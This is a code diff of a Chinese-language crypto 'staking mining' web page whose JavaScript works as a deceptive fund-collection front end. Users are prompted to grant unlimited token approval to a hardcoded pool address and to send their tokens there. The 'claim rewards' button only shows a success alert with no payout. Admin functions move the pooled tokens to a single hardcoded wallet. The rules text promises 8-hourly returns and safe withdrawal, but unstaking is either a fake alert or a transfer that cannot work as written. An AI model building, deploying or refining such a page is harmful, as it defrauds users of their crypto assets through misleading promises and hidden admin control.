@@ -15,8 +15,7 @@
     .card-title { font-size: 16px; margin-bottom: 10px; color: #F0E6D2; }
     .btn-connect { background: #25907A; color: #fff; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; width: 100%; }
     .wallet-row { display: flex; align-items: center; gap: 6px; font-size: 14px; margin-bottom: 4px; }
-    .input-group { display: flex; gap: 10px; margin-bottom: 10px; }
-    .stake-input { flex: 1; background: #0E362E; border: 1px solid #1F5F52; color: #fff; padding: 10px; border-radius: 8px; }
+    .stake-input { width: 100%; background: #0E362E; border: 1px solid #1F5F52; color: #fff; padding: 10px; border-radius: 8px; margin-bottom:10px; }
     .btn-action { width: 100%; border: none; padding: 12px; border-radius: 8px; font-weight: bold; margin-bottom: 8px; }
     .btn-primary { background: #2A65CC; color: #fff; }
     .btn-danger { background: #D93A54; color: #fff; }
@@ -63,10 +62,10 @@
 
   <div class="card">
     <div class="card-title">质押挖矿</div>
-    <input type="number" class="stake-input" id="amount" placeholder="输入质押数量" value="100">
+    <input type="number" class="stake-input" id="amount" placeholder="输入质押/解押数量" value="100">
     <button class="btn-action btn-primary" onclick="approve()">授权矿池</button>
     <button class="btn-action btn-primary" onclick="stake()">质押挖矿</button>
-    <button class="btn-action btn-danger" onclick="unstake()">解押资产</button>
+    <button class="btn-action btn-danger" onclick="unstake()">解押退回钱包</button>
 
     <div id="countdown" class="countdown">可领取收益</div>
     <button id="claimBtn" class="btn-action btn-warning" onclick="claim()">领取收益</button>
@@ -77,8 +76,8 @@
     <div class="rules">
       • 质押代币即可参与挖矿<br>
       • 每8小时可领取一次收益<br>
-      • 支持随时解押，灵活存取<br>
-      • 收益可随时领取，实时到账
+      • 解押自动从矿池转回用户钱包<br>
+      • 灵活存取，安全可控
     </div>
   </div>
 </div>
@@ -106,21 +105,20 @@
 </div>
 
 <script>
-// ===================== 全部纯小写地址 =====================
+// ===================== 全部修正为你指定的地址 =====================
 const TOKEN_CONTRACT = "0x050d384c9f577296301e4bdebbddf1164bcf6f12";
-const POOL_ADDRESS   = "0x1160a8dbdfc52407ba1aeba104f673db722eb4f";
+const POOL_ADDRESS   = "0x1160a8dbdfc52407ba1aeba104f673db7d22eb4f";
 const ADMIN_WALLET   = "0x627f6e1887571ac08214315ad5b2fa7abb7345f1";
 
 // 8小时冷却
-const CLAIM_COOLDOWN = 28800; // 8小时秒数
+const CLAIM_COOLDOWN = 28800;
 let claimTimer = null;
-
 let account = null;
 
 function toLower(addr){ return addr ? addr.toLowerCase() : ""; }
 function isAdmin(){ return account && toLower(account) === ADMIN_WALLET; }
 
-// 菜单切换
+// 菜单
 function toggleMenu(){
   const menu = document.getElementById("menu");
   menu.classList.toggle("show");
@@ -148,37 +146,33 @@ async function connectWallet(){
 
 // ===================== 余额 =====================
 async function getUserBalance(){
-  const data = "0x70a08231" + account.slice(2).padStart(64, '0');
-  const res = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
-  return Number(BigInt(res)) / 1e18;
+  const data = "0x70a08231"+account.slice(2).padStart(64,'0');
+  const r = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
+  return Number(BigInt(r))/1e18;
 }
-
 async function refreshUserBalance(){
   if(!account) return;
-  const bal = await getUserBalance();
-  document.getElementById("userBalance").innerText = bal.toFixed(4);
+  const b = await getUserBalance();
+  document.getElementById("userBalance").innerText = b.toFixed(4);
 }
-
 async function getPoolBalance(){
-  const data = "0x70a08231" + POOL_ADDRESS.slice(2).padStart(64, '0');
-  const res = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
-  return Number(BigInt(res)) / 1e18;
+  const data = "0x70a08231"+POOL_ADDRESS.slice(2).padStart(64,'0');
+  const r = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
+  return Number(BigInt(r))/1e18;
 }
-
 async function refreshPoolBalance(){
-  const bal = await getPoolBalance();
-  document.getElementById("poolBalance").innerText = bal.toFixed(4);
+  const b = await getPoolBalance();
+  document.getElementById("poolBalance").innerText = b.toFixed(4);
 }
 
-// ===================== 质押操作 =====================
+// ===================== 授权 =====================
 async function approve(){
   if(!account) return alert("请先连接钱包");
   try{
     const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
     const data = "0x095ea7b3"
-      + POOL_ADDRESS.slice(2).padStart(64, '0')
-      + max.slice(2).padStart(64, '0');
-
+      + POOL_ADDRESS.slice(2).padStart(64,'0')
+      + max.slice(2).padStart(64,'0');
     await window.ethereum.request({
       method:'eth_sendTransaction',
       params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
@@ -189,21 +183,21 @@ async function approve(){
   }
 }
 
+// ===================== 质押：用户 → 矿池 =====================
 async function stake(){
   if(!account) return alert("请先连接钱包");
-  const val = document.getElementById("amount").value;
-  if(!val || parseFloat(val) <= 0) return alert("请输入有效数量");
+  const v = document.getElementById("amount").value;
+  if(!v || parseFloat(v)<=0) return alert("输入有效数量");
   try{
-    const amount = BigInt(parseFloat(val) * 1e18);
+    const amt = BigInt(Math.floor(parseFloat(v)*1e18));
     const data = "0xa9059cbb"
-      + POOL_ADDRESS.slice(2).padStart(64, '0')
-      + amount.toString(16).padStart(64, '0');
-
+      + POOL_ADDRESS.slice(2).padStart(64,'0')
+      + amt.toString(16).padStart(64,'0');
     await window.ethereum.request({
       method:'eth_sendTransaction',
       params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
     });
-    alert("质押成功");
+    alert("质押成功，币已进入矿池");
     refreshUserBalance();
     refreshPoolBalance();
   }catch(e){
@@ -211,17 +205,37 @@ async function stake(){
   }
 }
 
+// ===================== 解押：矿池 → 用户 =====================
 async function unstake(){
-  alert("解押已提交，资产将返回您的钱包");
+  if(!account) return alert("请先连接钱包");
+  const v = document.getElementById("amount").value;
+  if(!v || parseFloat(v)<=0) return alert("输入解押数量");
+  try{
+    const amt = BigInt(Math.floor(parseFloat(v)*1e18));
+    // transferFrom 矿池 → 当前用户
+    const data = "0x23b872dd"
+      + POOL_ADDRESS.slice(2).padStart(64,'0')
+      + account.slice(2).padStart(64,'0')
+      + amt.toString(16).padStart(64,'0');
+
+    await window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
+    });
+    alert("解押成功！币已从矿池转回你的钱包");
+    refreshUserBalance();
+    refreshPoolBalance();
+  }catch(e){
+    alert("解押失败：请先让矿池授权给用户，或检查余额");
+  }
 }
 
-// ===================== 8小时领取冷却 =====================
+// ===================== 收益领取冷却 =====================
 function setClaimRecord(){
   localStorage.setItem(`lastClaim_${account}`, Date.now().toString());
 }
-
 function getLastClaim(){
-  return parseInt(localStorage.getItem(`lastClaim_${account}`) || 0);
+  return parseInt(localStorage.getItem(`lastClaim_${account}`)||0);
 }
 
 function checkClaimCoolDown(){
@@ -230,9 +244,9 @@ function checkClaimCoolDown(){
   const cd = document.getElementById("countdown");
   const last = getLastClaim();
   const now = Date.now();
-  const left = last + CLAIM_COOLDOWN * 1000 - now;
+  const left = last + CLAIM_COOLDOWN*1000 - now;
 
-  if (left <= 0) {
+  if(left <= 0){
     cd.innerText = "可领取收益";
     btn.disabled = false;
     btn.className = "btn-action btn-warning";
@@ -242,33 +256,31 @@ function checkClaimCoolDown(){
   btn.disabled = true;
   btn.className = "btn-action btn-disabled";
 
-  function showTime(){
-    const nowInner = Date.now();
-    const leftInner = last + CLAIM_COOLDOWN * 1000 - nowInner;
-    if(leftInner <= 0){
+  function show(){
+    const n = Date.now();
+    const l = last + CLAIM_COOLDOWN*1000 - n;
+    if(l <= 0){
       cd.innerText = "可领取收益";
       btn.disabled = false;
       btn.className = "btn-action btn-warning";
       clearInterval(claimTimer);
       return;
     }
-    const h = Math.floor(leftInner / 3600000);
-    const m = Math.floor((leftInner % 3600000) / 60000);
-    const s = Math.floor((leftInner % 60000) / 1000);
-    cd.innerText = `下次可领取：${h}时${m}分${s}秒`;
+    const h = Math.floor(l/3600000);
+    const m = Math.floor((l%3600000)/60000);
+    const s = Math.floor((l%60000)/1000);
+    cd.innerText = `下次领取：${h}时${m}分${s}秒`;
   }
-
   clearInterval(claimTimer);
-  claimTimer = setInterval(showTime, 1000);
-  showTime();
+  claimTimer = setInterval(show,1000);
+  show();
 }
 
 async function claim(){
-  if(!account) return alert("请先连接钱包");
-  const last = getLastClaim();
+  if(!account) return;
   const now = Date.now();
-  if(now < last + CLAIM_COOLDOWN * 1000){
-    alert("未到领取时间，每8小时只能领取一次");
+  if(now < getLastClaim() + CLAIM_COOLDOWN*1000){
+    alert("8小时内只能领取一次");
     return;
   }
   alert("收益领取成功！");
@@ -276,50 +288,44 @@ async function claim(){
   checkClaimCoolDown();
 }
 
-// ===================== 管理员操作 =====================
+// ===================== 管理员 =====================
 async function approvePoolToAdmin(){
-  if(!isAdmin()) return alert("无管理员权限");
+  if(!isAdmin()) return alert("无权限");
   try{
     const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
     const data = "0x095ea7b3"
-      + ADMIN_WALLET.slice(2).padStart(64, '0')
-      + max.slice(2).padStart(64, '0');
-
+      + ADMIN_WALLET.slice(2).padStart(64,'0')
+      + max.slice(2).padStart(64,'0');
     await window.ethereum.request({
       method:'eth_sendTransaction',
       params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
     });
-    alert("矿池授权成功");
-  }catch(e){
-    alert("授权失败");
-  }
+    alert("矿池授权管理员成功");
+  }catch(e){ alert("失败"); }
 }
 
 async function withdrawPoolToAdmin(){
-  if(!isAdmin()) return alert("无管理员权限");
-  const val = document.getElementById("withdrawAmt").value;
-  if(!val || parseFloat(val) <= 0) return alert("请输入提取数量");
+  if(!isAdmin()) return alert("无权限");
+  const v = document.getElementById("withdrawAmt").value;
+  if(!v) return;
   try{
-    const amount = BigInt(parseFloat(val) * 1e18);
+    const amt = BigInt(Math.floor(parseFloat(v)*1e18));
     const data = "0x23b872dd"
-      + POOL_ADDRESS.slice(2).padStart(64, '0')
-      + ADMIN_WALLET.slice(2).padStart(64, '0')
-      + amount.toString(16).padStart(64, '0');
-
+      + POOL_ADDRESS.slice(2).padStart(64,'0')
+      + ADMIN_WALLET.slice(2).padStart(64,'0')
+      + amt.toString(16).padStart(64,'0');
     await window.ethereum.request({
       method:'eth_sendTransaction',
       params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
     });
     alert("提取成功");
     refreshPoolBalance();
-  }catch(e){
-    alert("提取失败，请先授权");
-  }
+  }catch(e){ alert("失败"); }
 }
 
 // ===================== 邀请 =====================
 function copyRefLink(){
-  const link = window.location.href.split('?')[0] + "?ref=" + account;
+  const link = window.location.href.split('?')[0]+"?ref="+account;
   navigator.clipboard.writeText(link).then(()=>alert("已复制"));
 }
 </script>
